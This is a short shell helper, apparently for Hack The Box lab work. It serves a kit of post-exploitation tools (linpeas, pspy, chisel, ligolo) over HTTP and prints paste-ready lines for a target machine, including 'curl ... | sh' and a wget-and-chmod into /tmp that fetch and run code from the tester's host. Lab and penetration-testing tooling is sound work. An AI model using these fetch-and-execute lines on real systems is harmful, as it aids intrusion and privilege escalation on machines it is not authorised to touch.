# serve: hand files to a box over HTTP, with download lines ready to paste.
#   serve              the kit: linpeas.sh, pspy64, chisel, ligolo-agent
#   serve <dir> [port] any folder, e.g. serve /work/tools
# $kit is set by configuration.nix.
dir=${1:-$kit}
port=${2:-8000}
if [ ! -d "$dir" ]; then
  echo "usage: serve [dir] [port]" >&2
  exit 1
fi

ip=$(ip -4 -o addr show tun0 2>/dev/null | awk '{ split($4, a, "/"); print a[1] }' || true)
if [ -z "$ip" ]; then
  echo "The VPN is down (htb up), so the lines below use a placeholder IP." >&2
  ip=LAB_IP
fi

url=http://$ip:$port
echo "On the box:"
for f in "$dir"/*; do
  [ -f "$f" ] || continue
  name=$(basename "$f")
  case $name in
    *.sh) echo "  curl -s $url/$name | sh" ;;
    *) echo "  wget -q $url/$name -O /tmp/$name && chmod +x /tmp/$name" ;;
  esac
done
echo
exec python3 -m http.server "$port" --directory "$dir"
